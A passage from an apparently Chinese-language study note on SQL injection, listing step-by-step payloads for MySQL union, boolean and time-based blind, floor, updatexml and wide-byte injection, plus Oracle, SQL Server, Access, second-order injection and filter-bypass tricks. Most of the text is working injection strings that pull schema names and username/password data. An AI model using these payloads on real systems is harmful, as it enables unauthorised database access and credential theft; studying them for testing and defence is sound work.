数据库，他提供了访问数据库元数据的方式。（元数据是数据的数据，如数据库名或表名、列的数据类型或访问权限等）    </p></blockquote><ul><li><p>SCHEMATA表</p><blockquote><p>提供了当前 MySQL 实例中所有数据库的信息。（show database结果取自此表）</p><p>information_schema.CHEMATA可查：schema_name</p></blockquote></li><li><p>TABLES表</p><blockquote><p>提供了关于数据库中表（视图）的信息（表属于那个 schema、表类型、表引擎、创建时间等）。（show tables from “schema_name”）</p><p>information_schema.tables可查：table_schema，table_name</p></blockquote></li><li><p>COLUMNS表</p><blockquote><p>提供了表中的列信息（某个表的所有列以及每个列的信息）。（show columns from “schema_name.table_name”）</p><p>information_schema.columns可查：table_schema，table_name，column_name</p></blockquote></li></ul></li><li><p>union联合注入</p><blockquote><p>union ：联合注入（两个select结果格式应一致，union查询出多条会只保留一条）</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、判断注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># 数字型还是字符型</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、判断列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># 表示依照第一列排序，依此可以判断有多少列</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、判断报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 获得报错列，将<span class="keyword">sql</span>语句放到报错列上</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、获取当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,CONCAT_WS(<span class="type">CHAR</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),database(),version()),<span class="number">3</span></span><br><span class="line"># <span class="keyword">user</span>()：当前用户名，database()：当前数据库名，version()：当前版本，concat_ws()：指定分隔符拼接（参数一是分隔符）</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、获取数据库中表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span></span><br><span class="line"># group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span> ] [separator <span class="string">&#x27;分隔符&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"># <span class="number">6</span>、获取表中列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span></span><br><span class="line"># 同理</span><br><span class="line"></span><br><span class="line"># <span class="number">7</span>、获取列中数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27; &#x27;</span>,password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"># 同理</span><br></pre></td></tr></table></figure></li><li><p>常用函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 从n开始，输出m个结果</span><br><span class="line">limit n,m</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">current_user</span>()</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line">length()</span><br><span class="line">hex()</span><br><span class="line"></span><br><span class="line"># 数据库路径</span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line"># 数据库系统版本</span><br><span class="line">@<span class="variable">@version_compile_os</span></span><br><span class="line"># 写文件</span><br><span class="line">into_dumpfile()</span><br><span class="line"># 读文件</span><br><span class="line">load_file()</span><br><span class="line"># 拼接字符串</span><br><span class="line">concat(str,str)</span><br><span class="line"># 将<span class="keyword">group</span> <span class="keyword">by</span>产生的同一个分组中的值连接起来，返回一个字符串结果，用法如上。</span><br><span class="line">group_concat()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-布尔盲注"><a href="#2-3-布尔盲注" class="headerlink" title="2.3 布尔盲注"></a>2.3 布尔盲注</h4><ul><li><p>布尔盲注</p><blockquote><p>依照返回结果是 true 或 false 来进行注入。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(database())) <span class="operator">&gt;</span> num</span><br><span class="line"># 试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名（参数<span class="number">2</span>从<span class="number">1</span>开始）</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，逐步试出库名</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，逐步试出库名。limit是限制输出第一个表，如果有多个表要改第一个参数</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 同理步骤 <span class="number">3</span></span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>：填库名和表名</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 长度</span><br><span class="line">length(str)</span><br><span class="line"># 对str从第m字符开始向后截取n个字符（<span class="number">1</span>开始计数）</span><br><span class="line"><span class="built_in">substring</span>(str,m,n)</span><br><span class="line"># c 的 ascii 码</span><br><span class="line">ascii(c)</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-4-时间盲注"><a href="#2-4-时间盲注" class="headerlink" title="2.4 时间盲注"></a>2.4 时间盲注</h4><ul><li><p>时间盲注</p><blockquote><p>注入无返回结果或唯一返回结果时使用，依照睡眠时间判断为真还是为假。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep (if(length((<span class="keyword">select</span> database()))<span class="operator">=</span><span class="number">10</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span><span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">column</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">69</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 睡眠</span><br><span class="line">sleep(<span class="type">time</span>)</span><br><span class="line"># 三木运算符，条件，为真，为假。</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-5-floor盲注"><a href="#2-5-floor盲注" class="headerlink" title="2.5 floor盲注"></a>2.5 floor盲注</h4><ul><li><p>floor盲注</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 改变 limit 的第一个值来获得不同的库名，表名，列名</span><br><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat (database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>( rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><blockquote><p>原理：floor 注入是 rand 函数在与 group by 子句一起使用时多次计算导致的。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 返回不大于 x 的整数值</span><br><span class="line"><span class="built_in">floor</span>(x)</span><br><span class="line"># (<span class="number">0</span>,<span class="number">1</span>)的随机数（rand() <span class="operator">*</span> <span class="number">2</span> ∈ (<span class="number">0</span>,<span class="number">2</span>)）（用rand(<span class="number">0</span>)保证注入必报错）</span><br><span class="line">rand()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-6-XML注入"><a href="#2-6-XML注入" class="headerlink" title="2.6 XML注入"></a>2.6 XML注入</h4><ul><li><p>updatexml注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><blockquote><p>原理：输入的路径不符合格式导致报错，在路径栏中返回报错信息。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 对XML文档进行更新</span><br><span class="line">updatexml( XML_document , XPath_string , new_value )</span><br><span class="line"># String型，是目标XML文档的文件格式。</span><br><span class="line">XML_document</span><br><span class="line"># （XPath格式的字符串）是XML文档路径。</span><br><span class="line">XPath_string</span><br><span class="line"># String型，用于替换查找到的符合条件的数据。</span><br><span class="line">new_value</span><br></pre></td></tr></table></figure></li><li><p>extractvalue注入</p><blockquote><p>同理于 updatexml，将 updataxml 改成 extractvalue 即可。</p></blockquote></li></ul><h4 id="2-7-宽字节注入"><a href="#2-7-宽字节注入" class="headerlink" title="2.7 宽字节注入"></a>2.7 宽字节注入</h4><ul><li><p>宽字节注入</p><blockquote><p>原理：限字符集包含中文，程序通过 addslashes 函数在引号前会加入 \ ，然后会和前面的编码拼成一个宽字节，引号不会被转义，语句闭合导致注入成功。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1,database(),3 %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2、表名</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0</span>x<span class="operator">&lt;&gt;</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1 , group_concat(column_name),3 from information_schema.columns where table_schema=0x&lt;&gt; and table_name=0x&lt;&gt; %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4、值</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username , <span class="number">0x2a2a2a</span> , password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Oracle注入"><a href="#3-Oracle注入" class="headerlink" title="3 Oracle注入"></a>3 Oracle注入</h3><ul><li><p>数据库</p><ul><li><p>数据字典存在 SYSTEM 与 SYSAUX 表空间内的若干段中。</p></li><li><p>数据表</p><p><code>select table_name , tablespace_name from user_tables</code></p></li><li><p>表列</p><p><code>select table_name , column_name from user_tab_columns</code></p></li><li><p>dual表</p><p><code>select SYS_CONTEXT( &#39;USERENV&#39; , &#39;CURRENT_USER&#39; ) from dual</code> （属于 sys 模式，所有用户均可访问）</p></li></ul></li><li><p>联合注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># <span class="number">2</span>、列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># <span class="number">3</span>、报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">4</span>、当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">5</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,table_name <span class="keyword">from</span> user_tables</span><br><span class="line"># <span class="number">6</span>、列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,column_name <span class="keyword">from</span> user_tab_columns</span><br><span class="line"># <span class="number">7</span>、数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;username&quot;,&quot;passwiord&quot; <span class="keyword">from</span> &quot;user&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">1</span>、当前用户的信息</span><br><span class="line"><span class="keyword">select</span> SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual </span><br><span class="line"># <span class="number">2</span>、当前用户权限</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_roles</span><br><span class="line"># <span class="number">3</span>、数据库版本</span><br><span class="line"><span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$vsersion <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-SQL-Server注入"><a href="#4-SQL-Server注入" class="headerlink" title="4 SQL Server注入"></a>4 SQL Server注入</h3><ul><li><p>数据库</p><ul><li>sysdatabases：相关数据库信息</li><li>sysobjects：数据库中的对象信息</li><li>syscolumns：列名</li></ul></li><li><p>报错注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span>、数据库名：</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> ( <span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sys.databases ) <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> db_name() <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">#<span class="number">2</span>、表名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>)</span><br><span class="line">#<span class="number">3</span>、列名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;eims_User&#x27;</span>))</span><br><span class="line">#<span class="number">4</span>、值</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> item1 <span class="keyword">from</span> sec.dbo.eims_User)</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-Access注入"><a href="#5-Access注入" class="headerlink" title="5 Access注入"></a>5 Access注入</h3><ul><li><p>爆破注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、猜表名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、猜列名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> ColumnName <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、列数</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">7</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、报错点</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、数据</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,ColumnName,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br></pre></td></tr></table></figure></li></ul><h3 id="6-复杂注入"><a href="#6-复杂注入" class="headerlink" title="6 复杂注入"></a>6 复杂注入</h3><h4 id="6-1-二次注入"><a href="#6-1-二次注入" class="headerlink" title="6.1 二次注入"></a>6.1 二次注入</h4><blockquote><p>原理：首次注入时因为存在字符转义，无法注入成功，但是该数据会存入数据库中。第二次需要用到数据时，数据会从数据库中取出，由于取出的时候没有做过滤，导致注入代码会成功执行。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 案例</span><br><span class="line">#注册用户界面：</span><br><span class="line">用户名：ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23  &amp;&amp;  密码：123456  &amp;&amp; 邮箱：ctfs@ctfs.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#找回密码界面ctfs@ctfs.com</span></span><br><span class="line"><span class="string">#数据库做的操作如下，因为用户名被成功存入。</span></span><br><span class="line"><span class="string">select * from users where username = &#x27;</span>ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23</span></span><br></pre></td></tr></table></figure><h4 id="6-2-堆叠注入"><a href="#6-2-堆叠注入" class="headerlink" title="6.2 堆叠注入"></a>6.2 堆叠注入</h4><blockquote><p><a href="https://www.bbsmax.com/A/B0zqoY7K5v/">堆叠注入</a></p></blockquote><h3 id="7-sqlmap"><a href="#7-sqlmap" class="headerlink" title="7 sqlmap"></a>7 sqlmap</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a></p></blockquote><h3 id="8-SQL注入绕过"><a href="#8-SQL注入绕过" class="headerlink" title="8 SQL注入绕过"></a>8 SQL注入绕过</h3><h4 id="8-1-空格"><a href="#8-1-空格" class="headerlink" title="8.1 空格"></a>8.1 空格</h4><ol><li>/**/</li><li>制表符：%09</li><li>换行符：%0a</li><li>小括号：(username)</li><li>反引号：`</li></ol><h4 id="8-2-内联注释"><a href="#8-2-内联注释" class="headerlink" title="8.2 内联注释"></a>8.2 内联注释</h4><blockquote><p>原理：MySQL会执行放在 /<em>! … </em>/ 中的语句，当前数据库版本高于语句中的版本则会执行语句，低于则会报错。</p><p>例：<code>/*!50173select*/ * /*!from*/ user ;</code>（50173：5.01.73）</p></blockquote><h4 id="8-3-复写"><a href="#8-3-复写" class="headerlink" title="8.3 复写"></a>8.3 复写</h4><ul><li>双写</li></ul><blockquote><p><code>seLeCt</code></p></blockquote><ul><li>大小写</li></ul><blockquote><p>原理：利用 preg_replace 对指定字符过滤，会将指定字符转化成空（仅一次）</p><p><code>seselectlect</code></p></blockquote><h4 id="8-4-编码"><a href="#8-4-编码" class="headerlink" title="8.4 编码"></a>8.4 编码</h4><ol><li>双重 url ：<code>%256c</code>== <code>%6c</code>（%25 是 % 的 url 